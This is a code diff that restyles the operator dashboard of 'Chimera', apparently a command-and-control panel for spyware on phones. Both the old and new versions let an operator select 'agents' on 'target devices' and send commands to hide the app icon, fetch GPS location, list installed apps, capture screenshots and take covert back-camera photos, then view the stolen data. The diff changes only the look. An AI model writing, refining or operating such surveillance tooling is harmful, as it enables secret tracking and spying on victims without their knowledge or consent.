@@ -3,252 +3,204 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chimera Command Console</title>
+    <title>Chimera Dashboard</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-darkest: #010409;
-            --bg-dark: #0d1117;
-            --border-color: #21262d;
-            --text-primary: #c9d1d9;
-            --text-secondary: #8b949e;
-            --accent-cyan: #39c5f7;
-            --glow-cyan: rgba(57, 197, 247, 0.5);
-            --success: #2ea043;
-            --error: #f85149;
-            --font-mono: 'Roboto Mono', monospace;
+            --bg-primary: #111827;
+            --bg-secondary: #1F2937;
+            --bg-tertiary: #374151;
+            --border-color: #4B5563;
+            --text-primary: #F9FAFB;
+            --text-secondary: #9CA3AF;
+            --accent-blue: #3B82F6;
+            --font-sans: 'Inter', sans-serif;
         }
         * { box-sizing: border-box; }
         body {
-            background-color: var(--bg-darkest);
+            background-color: var(--bg-primary);
             color: var(--text-primary);
-            font-family: var(--font-mono);
+            font-family: var(--font-sans);
             margin: 0;
             height: 100vh;
             overflow: hidden;
-            background-image: linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px);
-            background-size: 1px 2px;
         }
-        .console-container {
-            display: grid;
-            grid-template-columns: 300px 1fr;
-            height: 100vh;
-        }
+        .app-layout { display: grid; grid-template-columns: 280px 1fr; height: 100vh; }
 
         /* --- Sidebar --- */
         .sidebar {
-            background-color: var(--bg-dark);
+            background-color: var(--bg-primary);
             border-right: 1px solid var(--border-color);
-            display: flex;
-            flex-direction: column;
-            padding: 20px;
+            display: flex; flex-direction: column; padding: 24px;
         }
         .sidebar-header {
-            font-weight: 700;
-            font-size: 1.5em;
-            color: var(--accent-cyan);
-            text-shadow: 0 0 8px var(--glow-cyan);
-            margin-bottom: 20px;
-            border-bottom: 1px solid var(--border-color);
-            padding-bottom: 15px;
+            font-weight: 700; font-size: 1.25em; letter-spacing: 0.1em;
+            margin: 0 0 24px 0; color: var(--text-primary);
         }
-        #device-list {
-            list-style: none; padding: 0; margin: 0; overflow-y: auto;
-        }
+        #device-list { list-style: none; padding: 0; margin: 0; overflow-y: auto; }
         #device-list li {
-            padding: 12px 15px; border-radius: 6px; cursor: pointer;
-            margin-bottom: 8px; word-break: break-all;
-            transition: all 0.2s ease; border: 1px solid var(--border-color);
+            display: flex; align-items: center; gap: 12px;
+            padding: 12px; border-radius: 8px; cursor: pointer;
+            margin-bottom: 8px; transition: background-color 0.2s ease;
         }
-        #device-list li:hover { background-color: var(--border-color); }
-        #device-list li.selected {
-            background-color: var(--accent-cyan); color: var(--bg-darkest);
-            font-weight: 700; box-shadow: 0 0 12px var(--glow-cyan);
+        #device-list li:hover { background-color: var(--bg-secondary); }
+        #device-list li.selected { background-color: var(--accent-blue); color: white; }
+        .device-icon { flex-shrink: 0; }
+        .device-id {
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+            font-size: 0.9em; font-family: monospace;
         }
 
         /* --- Main Content --- */
-        .main-content {
-            display: flex;
-            flex-direction: column;
-            height: 100vh;
-        }
-        .main-view {
-            flex-grow: 1;
-            padding: 25px;
-            overflow-y: auto;
-            position: relative;
-        }
-        .view-title {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            border-bottom: 1px solid var(--border-color);
-            padding-bottom: 15px;
-        }
-        .view-title h2 { margin: 0; }
-        .view-title button {
-             padding: 8px 16px; background: none; border: 1px solid var(--border-color);
-             color: var(--text-secondary); cursor: pointer; border-radius: 6px;
-        }
-        .view-title button:hover { background-color: var(--border-color); color: var(--text-primary); }
-
-        .command-grid {
+        .main-content { display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        .main-view { flex-grow: 1; padding: 32px; overflow-y: auto; }
+        .main-header { margin-bottom: 24px; }
+        .main-header h1 { margin: 0; font-size: 1.75em; }
+        .main-header p { margin: 4px 0 0; color: var(--text-secondary); }
+        
+        .command-card-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
-            gap: 20px;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 24px;
         }
-        .command-group { padding: 15px; border: 1px solid var(--border-color); border-radius: 8px; }
-        .command-group h3 { margin: 0 0 15px 0; font-size: 1.1em; }
-        .command-group button {
-            width: 100%; padding: 12px; margin-top: 10px;
-            background-color: var(--bg-dark); border: 1px solid var(--border-color);
-            color: var(--text-primary); border-radius: 6px; cursor: pointer; transition: all 0.2s ease;
+        .command-card {
+            background-color: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px; padding: 24px;
         }
-        .command-group button:hover:enabled { border-color: var(--accent-cyan); color: var(--accent-cyan); }
-        .command-group button:disabled { cursor: not-allowed; opacity: 0.4; }
+        .card-header {
+            display: flex; align-items: center; gap: 12px;
+            margin-bottom: 16px; border-bottom: 1px solid var(--border-color);
+            padding-bottom: 16px;
+        }
+        .card-header h3 { margin: 0; font-size: 1.1em; }
+        .card-body button {
+            width: 100%; padding: 12px; margin-top: 12px;
+            background-color: var(--bg-tertiary);
+            border: 1px solid var(--border-color); color: var(--text-primary);
+            border-radius: 8px; cursor: pointer; font-size: 0.9em; font-weight: 500;
+            transition: all 0.2s ease;
+        }
+        .card-body button:hover:enabled { border-color: var(--accent-blue); color: var(--accent-blue); }
+        .card-body button:disabled { cursor: not-allowed; opacity: 0.5; }
 
         /* --- Console --- */
         .console {
-            flex-shrink: 0;
-            height: 35%; /* Resizable */
-            background-color: var(--bg-dark);
-            border-top: 1px solid var(--border-color);
-            padding: 15px;
+            flex-shrink: 0; height: 30%; background-color: var(--bg-secondary);
+            border-top: 1px solid var(--border-color); padding: 16px;
+            overflow-y: auto; resize: vertical; font-family: monospace;
+            font-size: 0.85em;
+        }
+        .console-entry { display: flex; line-height: 1.6; }
+        .console-entry .timestamp { color: var(--text-secondary); margin-right: 1em; white-space: nowrap; }
+        .console-cmd .message { color: var(--accent-blue); }
+        .console-success .message { color: #22C55E; }
+        .console-error .message { color: #EF4444; }
+
+        /* --- Modal --- */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(17, 24, 39, 0.8);
+            display: flex; align-items: center; justify-content: center;
+            backdrop-filter: blur(5px); z-index: 1000;
+            opacity: 0; visibility: hidden; transition: all 0.3s ease;
+        }
+        .modal-overlay.visible { opacity: 1; visibility: visible; }
+        .modal-content {
+            background-color: var(--bg-secondary);
+            border-radius: 16px; padding: 24px;
+            max-width: 90vw; max-height: 90vh;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
             overflow-y: auto;
-            resize: vertical;
         }
-        .console-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
-        .console-header h3 { margin: 0; color: var(--text-secondary); }
-        #live-console-output { line-height: 1.7; }
-        .log-entry { display: flex; }
-        .log-entry .timestamp { color: var(--text-secondary); margin-right: 15px; white-space: nowrap; }
-        .log-cmd { color: var(--accent-cyan); }
-        .log-success { color: var(--success); }
-        .log-error { color: var(--error); }
-        .log-data .payload {
-            background-color: var(--bg-darkest); border: 1px solid var(--border-color);
-            padding: 10px; margin-top: 5px; border-radius: 6px;
-            display: block; white-space: pre-wrap;
-        }
-
-        /* --- Data Viewer Specific --- */
-        #data-viewer-content { max-width: 1000px; margin: 0 auto; }
-        #data-viewer-content img { max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color); }
-        #data-viewer-content a { color: var(--accent-cyan); text-decoration: none; font-size: 1.2em; }
-        #data-viewer-content pre { background-color: var(--bg-dark); border: 1px solid var(--border-color); padding: 15px; border-radius: 6px; }
-
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+        .modal-header h2 { margin: 0; }
+        .modal-close-btn { background: none; border: none; color: var(--text-secondary); cursor: pointer; padding: 8px; }
+        .modal-body img { max-width: 100%; height: auto; border-radius: 8px; }
+        .modal-body pre { background-color: var(--bg-primary); padding: 16px; border-radius: 8px; }
+        .modal-body a { color: var(--accent-blue); font-size: 1.1em; text-decoration: none; }
     </style>
 </head>
 <body>
-    <div class="console-container">
+    <div class="app-layout">
         <aside class="sidebar">
-            <div class="sidebar-header">AGENTS</div>
+            <h2 class="sidebar-header">CHIMERA</h2>
             <ul id="device-list"></ul>
         </aside>
 
         <main class="main-content">
             <div class="main-view" id="main-view">
-                <!-- Content will be injected by JS -->
+                <!-- Initial state / Device Dashboard is rendered here -->
             </div>
-            <div class="console" id="console">
-                <div class="console-header">
-                    <h3>LIVE CONSOLE</h3>
-                    <button id="btnClearConsole">Clear</button>
-                </div>
-                <div id="live-console-output"></div>
-            </div>
+            <div class="console" id="console"></div>
         </main>
     </div>
 
+    <div class="modal-overlay" id="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 id="modal-title">Data Received</h2>
+                <button class="modal-close-btn" id="modal-close-btn">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+                </button>
+            </div>
+            <div class="modal-body" id="modal-body"></div>
+        </div>
+    </div>
+    
     <script>
+        // --- DOM Elements ---
         const deviceList = document.getElementById('device-list');
-        const consoleOutput = document.getElementById('live-console-output');
+        const consoleOutput = document.getElementById('console');
         const mainView = document.getElementById('main-view');
-        
+        const modalOverlay = document.getElementById('modal-overlay');
+        const modalTitle = document.getElementById('modal-title');
+        const modalBody = document.getElementById('modal-body');
+        const modalCloseBtn = document.getElementById('modal-close-btn');
+
+        // --- State ---
         const API_BASE = '/.netlify/functions';
         let devices = [];
         let selectedDevice = null;
 
-        const commandMatrixHTML = `
-            <div class="view-title"><h2>Command Matrix</h2></div>
-            <div class="command-grid">
-                <div class="command-group"><h3>Stealth</h3><button id="btnHideIcon">Hide Icon</button><button id="btnShowIcon">Show Icon</button></div>
-                <div class="command-group"><h3>Recon</h3><button id="btnGetLocation">Get Location</button><button id="btnListApps">List Apps</button></div>
-                <div class="command-group"><h3>Surveillance</h3><button id="btnScreenshot">Take Screenshot</button><button id="btnTakePicture">Take Picture (Back)</button></div>
-                <div class="command-group"><h3>Data</h3><button id="btnFetchData">Fetch All Logs</button></div>
-            </div>`;
+        // --- SVG Icons ---
+        const ICONS = {
+            device: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>`,
+            stealth: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>`,
+            recon: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>`,
+            surveillance: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>`
+        };
 
-        function showCommandMatrix() {
-            mainView.innerHTML = commandMatrixHTML;
-            bindCommandButtons();
-        }
-
-        function showDataViewer(title, content) {
-            mainView.innerHTML = `
-                <div class="view-title">
-                    <h2>${title}</h2>
-                    <button id="backToCommands">Back to Commands</button>
-                </div>
-                <div id="data-viewer-content">${content}</div>`;
-            document.getElementById('backToCommands').addEventListener('click', showCommandMatrix);
-        }
-
-        function logToConsole(message, type = 'info') {
+        // --- Core Functions ---
+        const log = (message, type = 'info') => {
             const timestamp = new Date().toLocaleTimeString();
-            const logEntry = document.createElement('div');
-            logEntry.classList.add('log-entry', `log-${type}`);
-            logEntry.innerHTML = `<div class="timestamp">[${timestamp}]</div> <div class="message">${message}</div>`;
-            consoleOutput.appendChild(logEntry);
+            consoleOutput.innerHTML += `<div class="console-entry console-${type}"><span class="timestamp">${timestamp}</span><span class="message">${message}</span></div>`;
             consoleOutput.scrollTop = consoleOutput.scrollHeight;
-        }
+        };
 
-        async function fetchDevices() {
-            logToConsole('Querying for active agents...');
+        const fetchDevices = async () => {
+            log('Querying for active agents...');
             try {
                 const response = await fetch(`${API_BASE}/get-devices`);
                 if (!response.ok) throw new Error(`Server responded with ${response.status}`);
                 devices = await response.json();
                 renderDeviceList();
-                logToConsole(`Success: Found ${devices.length} agents.`, 'success');
+                log(`Found ${devices.length} agents.`, 'success');
                 if (devices.length > 0) {
-                    selectDevice(devices[0], deviceList.querySelector('li'));
+                    selectDevice(devices[0]);
                 } else {
-                    enableCommands(false);
+                    renderEmptyState();
                 }
-            } catch (error) { logToConsole(`Error fetching agents: ${error.message}`, 'error'); }
-        }
+            } catch (error) { log(`Error fetching agents: ${error.message}`, 'error'); }
+        };
 
-        function renderDeviceList() {
-            deviceList.innerHTML = '';
-            devices.forEach(device => {
-                const li = document.createElement('li');
-                li.textContent = device.deviceId;
-                li.onclick = () => selectDevice(device, li);
-                deviceList.appendChild(li);
-            });
-        }
-
-        function selectDevice(device, element) {
-            if (!element) return;
-            selectedDevice = device;
-            document.querySelectorAll('#device-list li').forEach(li => li.classList.remove('selected'));
-            element.classList.add('selected');
-            logToConsole(`Target locked: ${device.deviceId}`, 'info');
-            enableCommands(true);
-            showCommandMatrix();
-        }
-
-        function enableCommands(enabled) {
-            document.querySelectorAll('.command-group button').forEach(btn => btn.disabled = !enabled);
-        }
-
-        async function sendCommand(action, payload = {}) {
-            if (!selectedDevice) return logToConsole('Cannot send command: No target selected.', 'error');
+        const sendCommand = async (action, payload = {}) => {
+            if (!selectedDevice) return log('Cannot send command: No target selected.', 'error');
             const commandPayload = { token: selectedDevice.token, action, ...payload };
-            logToConsole(`Sending command [${action}] to target...`, 'cmd');
+            log(`Transmitting [${action}] to target...`, 'cmd');
             try {
                 const response = await fetch(`${API_BASE}/send-command`, {
                     method: 'POST',
@@ -257,68 +209,130 @@
                 });
                 const result = await response.json();
                 if (!response.ok) throw new Error(result.error || `Server responded with ${response.status}`);
-                logToConsole(`Command [${action}] successfully transmitted. Awaiting data return...`, 'success');
+                log(`Command [${action}] transmitted. Awaiting data...`, 'success');
                 setTimeout(fetchDeviceData, 5000);
-            } catch (error) { logToConsole(`Command transmission failed [${action}]: ${error.message}`, 'error'); }
-        }
-        
-        async function fetchDeviceData() {
-            if (!selectedDevice) return logToConsole('Cannot fetch data: No target selected.', 'error');
-            logToConsole(`Querying server for new data from target...`, 'info');
+            } catch (error) { log(`Command transmission failed: ${error.message}`, 'error'); }
+        };
+
+        const fetchDeviceData = async () => {
+            if (!selectedDevice) return log('Cannot fetch data: No target selected.', 'error');
+            log('Querying for new data from target...');
              try {
                 const response = await fetch(`${API_BASE}/get-device-data?deviceId=${selectedDevice.deviceId}`);
                 if (!response.ok) throw new Error(`Server responded with ${response.status}`);
                 const data = await response.json();
-                if(data.length === 0) return logToConsole('No new data received.', 'info');
+                if(data.length === 0) return log('No new data received.');
                 
-                logToConsole(`Received ${data.length} new data packets.`, 'success');
+                log(`Received ${data.length} new data packets.`, 'success');
                 let mostRecentFormattedItem = null;
                 data.forEach(item => {
-                    const dataPayload = JSON.stringify(item.payload, null, 2);
-                    logToConsole(`[${item.dataType}]<div class="payload">${dataPayload}</div>`, 'data');
                     if (['location', 'screenshot', 'list_apps'].includes(item.dataType)) {
                         mostRecentFormattedItem = item;
                     }
                 });
-                if(mostRecentFormattedItem) renderFormattedData(mostRecentFormattedItem);
-            } catch (error) { logToConsole(`Error fetching device data: ${error.message}`, 'error'); }
-        }
+                if(mostRecentFormattedItem) renderModal(mostRecentFormattedItem);
+            } catch (error) { log(`Error fetching data: ${error.message}`, 'error'); }
+        };
+        
+        // --- UI Rendering ---
+        const renderDeviceList = () => {
+            deviceList.innerHTML = devices.map(device => `
+                <li data-device-id="${device.deviceId}">
+                    <span class="device-icon">${ICONS.device}</span>
+                    <span class="device-id">${device.deviceId}</span>
+                </li>
+            `).join('');
+        };
 
-        function renderFormattedData(item) {
-            let title = `Data Received: ${item.dataType.toUpperCase()}`;
-            let content = `<h3>Timestamp: ${new Date(item.timestamp).toLocaleString()}</h3>`;
+        const renderEmptyState = () => {
+            mainView.innerHTML = `
+                <div class="main-header">
+                    <h1>No Agents Online</h1>
+                    <p>Activate an agent on a target device to begin.</p>
+                </div>`;
+        };
+        
+        const renderDashboard = (device) => {
+            mainView.innerHTML = `
+                <div class="main-header">
+                    <h1>Agent Dashboard</h1>
+                    <p>${device.deviceId}</p>
+                </div>
+                <div class="command-card-grid">
+                    <div class="command-card">
+                        <div class="card-header"> ${ICONS.stealth} <h3>Stealth</h3> </div>
+                        <div class="card-body">
+                            <button data-command="toggle_icon" data-payload='{"show": "false"}'>Hide Icon</button>
+                            <button data-command="toggle_icon" data-payload='{"show": "true"}'>Show Icon</button>
+                        </div>
+                    </div>
+                    <div class="command-card">
+                        <div class="card-header"> ${ICONS.recon} <h3>Recon</h3> </div>
+                        <div class="card-body">
+                            <button data-command="get_location">Get Location</button>
+                            <button data-command="list_apps">List Apps</button>
+                        </div>
+                    </div>
+                    <div class="command-card">
+                        <div class="card-header"> ${ICONS.surveillance} <h3>Surveillance</h3> </div>
+                        <div class="card-body">
+                            <button data-command="screenshot">Take Screenshot</button>
+                            <button data-command="picture" data-payload='{"camera_id": "0"}'>Take Picture (Back)</button>
+                        </div>
+                    </div>
+                </div>`;
+        };
+
+        const renderModal = (item) => {
+            modalTitle.textContent = `Data Received: ${item.dataType.toUpperCase()}`;
+            let content = ``;
             if (item.dataType === 'location') {
                 const { latitude, longitude } = item.payload;
-                content += `<a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">Open Location on Google Maps</a>`;
-                content += `<pre>${JSON.stringify(item.payload, null, 2)}</pre>`;
+                content = `<a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">Open Location on Google Maps</a><pre>${JSON.stringify(item.payload, null, 2)}</pre>`;
             } else if (item.dataType === 'screenshot') {
-                content += `<img src="data:image/jpeg;base64,${item.payload}" alt="Screenshot">`;
+                content = `<img src="data:image/jpeg;base64,${item.payload}" alt="Screenshot">`;
             } else {
-                 content += `<pre>${JSON.stringify(item.payload, null, 2)}</pre>`;
+                 content = `<pre>${JSON.stringify(item.payload, null, 2)}</pre>`;
             }
-            showDataViewer(title, content);
-        }
+            modalBody.innerHTML = content;
+            modalOverlay.classList.add('visible');
+        };
 
-        function bindCommandButtons() {
-            document.getElementById('btnHideIcon')?.addEventListener('click', () => sendCommand('toggle_icon', { show: 'false' }));
-            document.getElementById('btnShowIcon')?.addEventListener('click', () => sendCommand('toggle_icon', { show: 'true' }));
-            document.getElementById('btnGetLocation')?.addEventListener('click', () => sendCommand('get_location'));
-            document.getElementById('btnListApps')?.addEventListener('click', () => sendCommand('list_apps'));
-            document.getElementById('btnScreenshot')?.addEventListener('click', () => sendCommand('screenshot'));
-            document.getElementById('btnTakePicture')?.addEventListener('click', () => sendCommand('picture', { camera_id: '0' }));
-            document.getElementById('btnFetchData')?.addEventListener('click', fetchDeviceData);
-            enableCommands(selectedDevice !== null);
-        }
+        // --- Event Handlers ---
+        const selectDevice = (device) => {
+            selectedDevice = device;
+            document.querySelectorAll('#device-list li').forEach(li => {
+                li.classList.toggle('selected', li.dataset.deviceId === device.deviceId);
+            });
+            renderDashboard(device);
+        };
         
-        document.getElementById('btnClearConsole').addEventListener('click', () => {
-            consoleOutput.innerHTML = '';
-            logToConsole('Console cleared.');
+        deviceList.addEventListener('click', (e) => {
+            const li = e.target.closest('li');
+            if(li) {
+                const device = devices.find(d => d.deviceId === li.dataset.deviceId);
+                if(device) selectDevice(device);
+            }
         });
-        
+
+        mainView.addEventListener('click', (e) => {
+            const button = e.target.closest('button[data-command]');
+            if(button) {
+                const command = button.dataset.command;
+                const payload = button.dataset.payload ? JSON.parse(button.dataset.payload) : {};
+                sendCommand(command, payload);
+            }
+        });
+
+        modalCloseBtn.addEventListener('click', () => modalOverlay.classList.remove('visible'));
+        modalOverlay.addEventListener('click', (e) => {
+            if(e.target === modalOverlay) modalOverlay.classList.remove('visible');
+        });
+
+        // --- Initial Load ---
         window.onload = () => {
-            logToConsole('Chimera Command Console Initialized.');
-            showCommandMatrix();
-            enableCommands(false);
+            log('Chimera Dashboard Initialized.');
+            renderEmptyState();
             fetchDevices();
         };
     </script>
